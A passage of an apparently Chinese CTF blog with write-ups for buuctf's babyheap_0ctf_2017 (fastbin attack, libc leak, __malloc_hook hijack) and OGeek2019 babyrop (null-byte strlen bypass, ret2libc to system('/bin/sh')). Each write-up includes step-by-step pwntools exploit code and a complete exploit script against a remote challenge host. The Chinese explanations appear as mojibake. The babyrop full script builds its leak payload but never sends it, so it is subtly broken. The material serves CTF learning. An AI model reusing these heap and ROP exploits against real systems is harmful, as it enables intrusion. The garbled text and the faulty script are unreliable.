<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure></p></li>
<li><p>æ‹–è¿›IDA64åˆ†æï¼Œè®©åæ±‡ç¼–ä»¥åçš„ä»£ç å¥½çœ‹ä¸€ç‚¹<br />
<img src="/pic/Pasted%20image%2020230814134313.png" /> <img
src="/pic/Pasted%20image%2020230814134623.png" />
æ³¨ï¼šIDAä¸­å¿«æ·é”®yå¯ä»¥ä¿®æ”¹å˜é‡ç±»å‹ï¼Œä¸Šå›¾Allocå‡½æ•°çš„æˆ‘å°†a1çš„å˜é‡ç±»å‹<code>_int64</code>ä¿®æ”¹ä¸º<code>_int64*</code></p></li>
<li><p>IDAåˆ†æå¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä»¥ä¸‹æ€è·¯ï¼š</p>
<ol type="1">
<li>Fillå‡½æ•°çš„è¾“å…¥å­—ç¬¦æ•°é‡æ˜¯å—æˆ‘ä»¬æ§åˆ¶çš„ï¼Œæ‰€ä»¥å¯ä»¥å †æº¢å‡ºï¼›</li>
<li>ç”±äºæœ¬é¢˜å¹¶æ²¡æœ‰ç»™å‡ºsystemç­‰å¯ä»¥ç›´æ¥ææƒçš„å‡½æ•°ï¼Œæ‰€ä»¥è€ƒè™‘æ³„éœ²libcåœ°å€
<ol type="1">
<li>è¦æ³„éœ²libcåœ°å€ï¼Œè‚¯å®šè¦è¯»å­˜æœ‰libcåœ°å€çš„åœ°å€
<ol type="1">
<li>å“ªé‡Œå­˜ç€libcåœ°å€ï¼Ÿunsorted
binä»…æœ‰ä¸€ä¸ªchunkæ—¶ï¼Œæ­¤chunkçš„fdå’Œbkéƒ½æŒ‡å‘<code>åœ°å€main_arena+58</code>ï¼Œè€Œmain_arenaæ˜¯libcçš„dataæ®µä¸­çš„ä¸€ä¸ªå…¨å±€é™æ€å˜é‡ï¼Œæ‰€ä»¥æ³„éœ²å®ƒå°±å¯ä»¥çŸ¥é“libc_baseï¼ˆæ³¨ï¼šæ­¤å¤„å­˜æ”¾çš„æ˜¯topchunkçš„åœ°å€ï¼‰</li>
<li>æ€ä¹ˆå»è¯»unsorted binçš„fd/bkæŒ‡é’ˆï¼Ÿå †æº¢å‡º+å¤šæ¬¡free/alloc</li>
</ol></li>
</ol></li>
<li>æœ‰äº†libcåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹fastbinçš„fdæŒ‡é’ˆï¼Œåœ¨ç¨‹åºçš„__malloc_hookå¤„(ç”¨libc+åç§»æ¥è®¡ç®—)ç”³è¯·ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥æ“æ§çš„å †å—ï¼Œå¹¶åœ¨å…¶ä¸­å†™å…¥ogçš„åœ°å€æ¥ææƒ</li>
</ol></li>
<li><p>å¤§æ¦‚æ€è·¯æˆ‘ä»¬æœ‰äº†ï¼Œæ¥ä¸‹æ¥æ˜¯å†™exp+è°ƒè¯•éªŒè¯æ€è·¯ã€‚æˆ‘ä»¬ä¸ºäº†èƒ½å¤Ÿå°†chunkæ”¾å…¥unsorted
binï¼Œè‚¯å®šéœ€è¦ä¸€ä¸ªsmall chunkï¼›è¦fastbin attackï¼Œè‚¯å®šéœ€è¦ä¸¤ä¸ªfastbin
chunkï¼›ä¸ºäº†æ–¹ä¾¿æ§åˆ¶è¿™ä¸‰ä¸ªchunkï¼Œæˆ‘ä»¬å†è®¾ç½®ä¸¤ä¸ªfastbin chunkï¼Œå³ï¼š
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index = 4</span></span><br></pre></td></tr></table></figure> æ­¤æ—¶å †çš„æƒ…å†µå¦‚ä¸‹ <img
src="/pic/Pasted%20image%2020230814140742.png" /></p></li>
<li><p>Freeæ‰indexä¸º1å’Œ2çš„chunkï¼Œç»™åé¢allocç•™å‡ºç©ºé—´ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
heapæƒ…å†µå¦‚ä¸‹ <img src="/pic/Pasted%20image%2020230814141436.png" />
binæƒ…å†µå¦‚ä¸‹ <img
src="/pic/Pasted%20image%2020230814141724.png" /></p></li>
<li><p>å †æº¢å‡ºï¼Œæ“æ§fastbin</p>
<ol type="1">
<li>ç°åœ¨æ˜¯main_arena_fastbin_0x20 ---&gt; chunk2 ---&gt;chunk1</li>
<li>æˆ‘ä»¬æƒ³åŠæ³•è®©å®ƒå˜æˆ xxx_0x20 ---&gt; chunk2 ---&gt;chunk4
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
ï¼ˆè¿™é‡Œè¯»è€…å¯ä»¥è‡ªå·±gdb.attachç”¨binå‘½ä»¤å»æŸ¥çœ‹fastbinå‰åçš„çŠ¶æ€ï¼‰</li>
</ol></li>
<li><p>ç”±äºä»fastbinç”³è¯·chunkæ—¶ä¼šæ£€æŸ¥fastbinä¸­chunkçš„sizeï¼Œå¦‚æœä¸åŒ¹é…åˆ™æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡å †æº¢å‡ºä¿®æ”¹chunk4çš„sizeï¼Œè®©å…¶ä»0x91å˜ä¸º0x21
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>ç”³è¯·ä¸¤ä¸ªå¤§å°ä¸º0x10çš„chunkï¼Œå¯ä»¥çœ‹åˆ°<code>åŸchunk1</code>æŒ‡å‘äº†<code>åŸchunk2çš„åœ°å€</code>ï¼Œ<code>åŸchunk2</code>æŒ‡å‘äº†<code>åŸchunk4çš„åœ°å€</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘chunk4äº†ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªæŒ‡é’ˆæ¥é‡Šæ”¾ï¼Œä¸€ä¸ªæŒ‡é’ˆæ¥è¯»å–ï¼Œæ–¹ä¾¿é˜…è¯»æˆ‘ä»¬åˆ†åˆ«å‘½åä¸ºpointer_chunk4å’Œpointer_chunk2
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure> heapæƒ…å†µå¦‚ä¸‹ <img
src="/pic/Pasted%20image%2020230814143302.png" /></p></li>
<li><p>ç›´æ¥ç”¨pointer_chunk4é‡Šæ”¾chunk4ï¼Œptmallocä¼šå› ä¸ºæ‰¾ä¸åˆ°topchunkè€ŒæŠ¥é”™ã€‚æ‰€ä»¥æˆ‘ä»¬åº”è¯¥æ¢å¤chunk4çš„sizeåˆ°0x91å†freeï¼Œä½†è¿™æ ·ä¼šå¯¼è‡´chunk4ç›´æ¥è·Ÿtopchunkåˆå¹¶ã€‚æ‰€ä»¥æˆ‘ä»¬è¦å…ˆæ¢å¤chunk4çš„sizeåˆ°0x91å†ç”³è¯·ä¸€ä¸ª0x80å¤§å°çš„å †å—éš”ç¦»topchunkå†free
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>æ­¤æ—¶chunk4çš„fdå’Œbkå°±å·²ç»å­˜æ”¾ç€ä¸€ä¸ªåœ°å€äº†ï¼Œæˆ‘ä»¬é€šè¿‡pointer_chunk2æ¥æŠŠä»–è¯»å‡ºæ¥ã€‚è¿™ä¸ªåœ°å€æ˜¯main_arena+88ï¼Œæ‰“å¼€libcå¯ä»¥çœ‹åˆ°main_arenaçš„åœ°å€ä¸º0x3c4b20ï¼Œæ‰€ä»¥æˆ‘ä»¬è·å¾—çš„libc_addréœ€è¦å‡88å†å‡0x3c4b20ï¼Œå³å‡å»0x3C4B78
<img src="/pic/Pasted%20image%2020230814144704.png" />
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base Â  ---&gt; Â  &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure></p></li>
<li><p>æˆ‘ä»¬ç°åœ¨æœ‰äº†libcçš„åœ°å€ï¼Œä¸‹ä¸€æ­¥æ˜¯åŠ«æŒmalloc_hookã€‚ç”±äºæˆ‘ä»¬è¦é€šè¿‡fastbinæ¥åœ¨malloc_hookå¤„ç”³è¯·å †å—ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡fastbinå¯¹äºsizeçš„æ£€éªŒï¼Œæ‰€ä»¥çœ‹ä¸€ä¸‹malloc_hookå‰é¢æœ‰æ²¡æœ‰æˆ‘ä»¬èƒ½å¤Ÿç”³è¯·å †å—çš„åœ°æ–¹
<img src="/pic/Pasted%20image%2020230814145721.png" />
å‘ç°aedå¤„çš„0x0000007fç¬¦åˆfastbinçš„ç©ºé—´ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨libc_base+0x3c4aed(è¿™ä¸ªç”¨å½“å‰åœ°å€å‡å»åŸºåœ°å€å³å¯ç®—å‡º)æ¥ç”³è¯·<br />
âš è¿™é‡Œå›¾aedå†™é”™äº†ï¼Œè€Œä¸”ä¸åº”è¯¥çœ‹è¿™ä¸ªç•Œé¢ï¼Œæ•´ä½“ä¸Šçš„chunkåº”è¯¥æ˜¯
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># å°†unsortedbinä¸­çš„chunk4åˆ‡0x60å¤§å°ç”³è¯·å‡ºæ¥</span></span><br><span class="line">free(<span class="number">4</span>)                                        <span class="comment"># æŠŠchunk4æ”¾åˆ°fastbinä¸­ï¼Œä¾¿äºç”¨pointer_chunk2æ“æ§</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)              <span class="comment"># æŠŠç”³è¯·å—å†™è¿›malloc_hookå‰é¢</span></span><br><span class="line">fill(<span class="number">2</span>,payload)                                <span class="comment"># è¿™ä¸€æ­¥åï¼Œfastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># æŠŠchunk4ç”³è¯·å›æ¥</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># åœ¨malloc_hookå¤„æ„é€ å †ï¼Œindex=6</span></span><br></pre></td></tr></table></figure>
<ol start="13" type="1">
<li><p>æˆ‘ä»¬ä¿®æ”¹chunk6çš„å†…å®¹ï¼Œå³ä¿®æ”¹malloc_hookï¼Œæˆ‘ä»¬ç”¨ogæ¥ææƒ
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>è‹¥malloc_hookä¸ä¸ºç©ºï¼Œå†ç”³è¯·å †æ—¶ä¼šå…ˆè°ƒç”¨malloc_hookå¤„çš„å‡½æ•°ï¼Œæ‰€ä»¥éšä¾¿ç”³è¯·å³å¯cat
flag <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">255</span>)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h3 id="å®Œæ•´exp">â…¢. å®Œæ•´EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25970</span></span><br><span class="line">file = <span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">Â  Â  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">Â  Â  io.recvline()</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base Â  ---&gt; Â  &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">255</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ä¸€äº›ç–‘é—®">â…£. ä¸€äº›ç–‘é—®</h2>
<ol type="1">
<li><p>__malloc_hookä¸æ˜¯åœ¨dataæ®µä¸­å—ï¼Ÿè¿™é¢˜å¼€äº†FULL
RELROä¸ºä»€ä¹ˆå¯ä»¥æ”¹å•ŠğŸ¤”</p></li>
<li><p>ç¬¬ä¹æ­¥ä¸­heapä¸­chunk2çš„Addrä¸ºä»€ä¹ˆè¿˜æ˜¯40è€Œä¸æ˜¯80å•Šï¼Ÿ</p></li>
<li><p>ç¬¬åæ­¥ä¸ºä»€ä¹ˆchunk4ä¼šè·Ÿtopchunkåˆå¹¶ï¼Ÿæ˜¯å“ªä¸ªbinçš„æœºåˆ¶ï¼Ÿ</p>
<ol type="1">
<li>unsortedbinï¼Œåå‘åˆå¹¶</li>
</ol></li>
<li><p><strong><em>ä¸ºä»€ä¹ˆéè¦åœ¨aedå¤„ç”³è¯·å †å—ï¼Ÿ</em></strong></p>
<ol type="1">
<li>fastbinæŒ‡é’ˆæŒ‡å‘0xaedï¼Œè¯´æ˜0xaed-8æ˜¯sizeï¼Œ0xaed-0x10æ˜¯prev_sizeï¼Œæ­£å¥½ä¼ªè£…chunk</li>
</ol></li>
</ol>
<h1 id="x02-buuctf-ogeek2019babyrop_wp">0x02 buuctf
[OGeek2019]babyrop_wp</h1>
<blockquote>
<p>ç½‘ä¸Šå¾ˆå¤šwpå·²ç»ä¸é€‚ç”¨äº†ï¼Œæ‰€ä»¥æ¥æ›´æ–°ä¸€æ³¢XD</p>
</blockquote>
<h2 id="x00-çŸ¥è¯†ç‚¹">0x00 çŸ¥è¯†ç‚¹</h2>
<ol type="1">
<li>ret2libc</li>
<li>æä¾›libcçš„æ‰“æ³•</li>
<li>ç»•è¿‡strlen &amp; strncmpå‡½æ•°</li>
</ol>
<h2 id="x01-è§£é¢˜æ­¥éª¤">0x01 è§£é¢˜æ­¥éª¤</h2>
<blockquote>
<p>ä¸è´´å›¾äº†ï¼ŒæŒ‰ä¼ªä»£ç é¡ºåºæ¥</p>
</blockquote>
<ol type="1">
<li>fdæ˜¯urandomåº“ç”Ÿæˆçš„éšæœºæ•°</li>
<li>å°†fdè¯»4ä½è¿›buf</li>
<li>å°†bufä½œä¸ºå‚æ•°ä¼ è¿›å‡½æ•°Aï¼Œåœ¨Aä¸­ç§°ä½œa1</li>
<li>å°†a1è¯»è¿›s</li>
<li><strong>ç”¨æˆ·è¾“å…¥buf</strong>ï¼Œä½†é™åˆ¶è¯»å…¥é•¿åº¦0x20ï¼Œæ— æ³•æº¢å‡ºï¼›ä½†å¯ä»¥è€ƒè™‘æ³„éœ²</li>
<li>v1èµ‹å€¼ä¸ºbufçš„é•¿åº¦ï¼Œç»•è¿‡strlen &amp; strncmpå‡½æ•°å¯ä»¥ç”¨'\x00'</li>
<li>è¿”å›buf[7]ï¼Œä¼ å…¥å‡½æ•°Bï¼Œåœ¨Bä¸­ç§°ä½œa1ï¼Œæ˜¯readçš„æ£€æµ‹é•¿åº¦ï¼Œå¦‚æœè¶³å¤Ÿé•¿å¯ä»¥æ„é€ æº¢å‡º
äºæ˜¯å‡½æ•°Aä¸­çš„readæˆ‘ä»¬æœ‰æ€è·¯äº†ï¼Œå³ 1. ç»•è¿‡strlen 2. è¿”å›buf[7]è¶Šå¤§è¶Šå¥½
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)                              # Q1ï¼šä¸ºä»€ä¹ˆéå¾—æ˜¯sendlineè€Œä¸èƒ½æ˜¯sendï¼Ÿ</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
<li>Bä¸­è§‚å¯Ÿæ ˆçš„ç»“æ„å¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨0xE7+4çš„åƒåœ¾æ•°æ®æŠµè¾¾è¿”å›åœ°å€</li>
<li>ç”±äºstringä¸­å¹¶æ²¡æœ‰æ‰¾åˆ°system('/bin/sh')ï¼Œè€Œé¢˜ç›®æä¾›äº†libcï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ³„éœ²libcåŸºåœ°å€ï¼›ç”±äºå‡½æ•°Bç»“æŸåç¨‹åºå³å°†ç»“æŸï¼Œæˆ‘ä»¬å·²ç»æ²¡æœ‰æº¢å‡ºçš„ç‚¹äº†ï¼Œæ‰€ä»¥è€ƒè™‘å°†mainä½œä¸ºè¿”å›åœ°å€ï¼Œå†æ¥æä¾›ä¸€æ¬¡æº¢å‡ºï¼Œæ‰€ä»¥è€ƒè™‘æ„é€ payload2ï¼š
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxxx</span><br><span class="line">xxxxxx&lt;-----åƒåœ¾æ•°æ®</span><br><span class="line">puts_plt&lt;---è°ƒç”¨puts</span><br><span class="line">main_addr&lt;--å°†putsçš„è¿”å›åœ°å€å‹æ ˆï¼Œå³å°†eipçš„ä¸‹ä¸€æ¡æŒ‡ä»¤å‹æ ˆ</span><br><span class="line">puts_got&lt;---å°†putsçš„å‚æ•°å¼¹ç»™puts</span><br><span class="line"></span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line"></span><br><span class="line"># payload  =  b&#x27;a&#x27;*junk + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line"></span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)      # Q2: putsä¸ºä»€ä¹ˆä¸ä¼šæ‰“å°åé¢çš„å†…å®¹äº†ï¼Ÿä¸ºä»€ä¹ˆputs_gotåé¢ä¸€å®šæ˜¯å¯ä»¥è¢«è½¬æ¢ä¸º0açš„00ï¼Ÿ</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line"></span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># æ³¨1ï¼šputs(const char* arg1)ä¸€ç›´æ‰“å°ï¼Œç›´åˆ°é‡åˆ°&#x27;\0&#x27;ï¼Œä¸¢å¼ƒ&#x27;\0&#x27;å¹¶è¾“å‡º&#x27;\n&#x27;</span><br><span class="line"># æ³¨2ï¼šsszie_t write(fd,const char* src,length) (fd=1,length=32/8 or 64/8)</span><br></pre></td></tr></table></figure></li>
<li>æ³„éœ²libcåœ°å€åï¼Œæ³„éœ²<code>system</code>å’Œ<code>/bin/sh</code>çš„åœ°å€
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">offset   = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br></pre></td></tr></table></figure></li>
<li>å†è¿›è¡Œä¸€æ¬¡ç»•è¿‡strncmp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
<li>æœ€åææƒ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)    # ç»†èŠ‚2ï¼šè¦†ç›–è¿”å›åœ°å€æ—¶ï¼Œ32ä½éœ€è¦åœ¨æ ˆä¸Šè¡¥å……è¿”å›åœ°å€</span><br><span class="line">                                                                 # Q3ï¼šä¸ºä»€ä¹ˆï¼Ÿ</span><br><span class="line">io.send(payload)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
<li>æœ€åè´´ä¸€ä¸‹å…¨éƒ¨exp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,26218)</span><br><span class="line"># context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">  </span><br><span class="line">puts_got =elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt =elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_addr = 0x08048825</span><br><span class="line">  </span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line">  </span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line">  </span><br><span class="line">offset   = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line">  </span><br><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="x02-ä¸€äº›æ€è€ƒ">0x02 ä¸€äº›æ€è€ƒ</h2>
<ol type="1">
<li>æœ¬é¢˜è¿˜å¯ä»¥æœ‰ä»¥ä¸‹å‡ ç§æ‰“æ³•
<ol type="1">
